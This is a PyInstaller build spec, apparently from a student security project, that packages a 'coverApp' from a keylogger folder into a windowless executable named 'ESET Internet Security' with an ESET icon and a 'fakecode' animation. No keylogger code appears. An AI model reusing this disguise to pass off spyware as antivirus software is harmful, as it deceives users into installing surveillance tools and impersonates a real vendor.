# -*- mode: python -*-

block_cipher = None


a = Analysis(['coverApp.py'],
             pathex=['C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\keylogger'],
             binaries=[],
             datas=[],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
a.datas += [('background.png', 'C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\keylogger\\background.png', 'DATA'),
('fakecode.gif', 'C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\keylogger\\fakecode.gif', 'DATA'),
('eset.ico', 'C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\keylogger\\eset.ico', 'DATA')]
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='ESET Internet Security',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          runtime_tmpdir=None,
          console=False, icon='eset.ico')
